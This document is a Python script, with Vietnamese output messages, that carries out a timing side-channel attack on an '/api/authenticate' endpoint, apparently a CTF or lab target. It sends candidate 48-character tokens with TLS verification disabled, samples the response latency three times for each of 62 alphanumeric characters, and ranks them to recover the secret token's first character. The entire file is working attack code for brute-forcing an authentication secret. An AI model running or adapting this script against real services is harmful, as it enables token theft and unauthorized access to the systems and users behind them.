import requests
import statistics
import string
import time
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 3.0):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=15)
            dt = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                time.sleep(3.5)
                continue
            return dt, r.status_code, len(r.content), dict(r.headers), r.text
        except Exception as e:
            time.sleep(3.5)

charset = string.ascii_letters + string.digits
print(f"=== TIẾN HÀNH THỬ NGHIỆM VÀ KIỂM CHỨNG TOÀN BỘ BẢNG KÝ TỰ (62 KÝ TỰ) ===")
print(f"Tổng số ký tự: {len(charset)}")
print(f"Kiểm tra: Trạng thái, Độ dài phản hồi, Header và Độ trễ (3 mẫu/ký tự)\n")

records = []
for i, c in enumerate(charset):
    token = c + "0" * 47
    samples = []
    statuses = []
    lengths = []
    for s_idx in range(3):
        dt, status, length, headers, text = query(token, delay=3.0)
        samples.append(dt)
        statuses.append(status)
        lengths.append(length)
    
    med = statistics.median(samples)
    records.append({
        "char": c,
        "median": med,
        "samples": samples,
        "status": statuses[0],
        "length": lengths[0]
    })
    print(f"[{i+1:2d}/62] Char '{c}': Status={statuses[0]}, Len={lengths[0]}, Med={med:.2f}ms, Mẫu={[round(x,1) for x in samples]}")

records.sort(key=lambda x: x["median"], reverse=True)
print("\n=== TOP 10 KÝ TỰ CÓ ĐỘ TRỄ CAO NHẤT ===")
for r in records[:10]:
    print(f"Char '{r['char']}': Median={r['median']:.2f}ms, Len={r['length']}, Samples={[round(x,1) for x in r['samples']]}")

print("\n=== 10 KÝ TỰ CÓ ĐỘ TRỄ THẤP NHẤT ===")
for r in records[-10:]:
    print(f"Char '{r['char']}': Median={r['median']:.2f}ms, Len={r['length']}, Samples={[round(x,1) for x in r['samples']]}")
